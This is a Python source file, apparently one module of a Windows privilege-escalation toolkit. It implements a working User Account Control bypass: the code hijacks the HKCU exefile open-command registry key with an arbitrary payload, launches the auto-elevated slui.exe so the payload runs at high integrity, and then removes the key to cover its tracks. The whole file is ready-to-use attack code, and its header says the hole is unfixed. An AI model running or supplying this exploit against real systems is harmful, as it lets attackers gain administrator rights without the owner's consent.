"""
Works from: Windows 8.1 (9600)
Fixed in: unfixed
"""
import os
import time
import ctypes
import _winreg
from core.prints import *

class disable_file_system_redirection:
    #http://code.activestate.com/recipes/578035-disable-file-system-redirector/
    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
    def __enter__(self):
        self.old_value = ctypes.c_long()
        self.success = self.disable(ctypes.byref(self.old_value))
    def __exit__(self, type, value, traceback):
        if self.success:
            self.revert(self.old_value)

def slui(payload):
	print """
 -------------------------------------------------------------
 slui.exe is an auto-elevated binary that is vulnerable
 to file handler hijacking. 
 
 Read access to HKCU\Software\Classes\exefile\shell\open
 is performed upon execution. Due to the registry key 
 being accessible from user mode, an arbitrary executable
 file can be injected.

 When everything worked correctly, the payload should be
 spawned with high IL.
 -------------------------------------------------------------
 """
	print_info("Payload: {}".format(payload))
	print_info("Attempting to create registry key")
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Software\Classes\exefile\shell\open\command"))
								
		_winreg.SetValueEx(key,
				None,
				0,
				_winreg.REG_SZ,
				payload)

		_winreg.SetValueEx(key,
				"DelegateExecute",
				0,
				_winreg.REG_SZ,
				None)

		_winreg.CloseKey(key)
		print_success("Registry key created")
	except Exception as error:
		print_error("Unable to create key")
		return False

	print_info("Pausing for 5 seconds before executing")
	time.sleep(5)

	print_info("Attempting to create process")
	with disable_file_system_redirection():
		try:
			if (ctypes.windll.Shell32.ShellExecuteA(None,"RunAs","slui.exe",None,None,1) == 42):
				print_success("Process started successfully")
			else:
				print_error("Problem creating process")
				return False
		except Exception as error:
			print_error("Problem creating process")
			return False
	
	print_info("Pausing for 5 seconds before cleaning")
	time.sleep(5)

	print_info("Attempting to remove registry key")
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
				os.path.join("Software\Classes\exefile\shell\open\command"))
		print_success("Registry key was deleted")		
	except Exception as error:
		print_error("Unable to delete key")
		return False
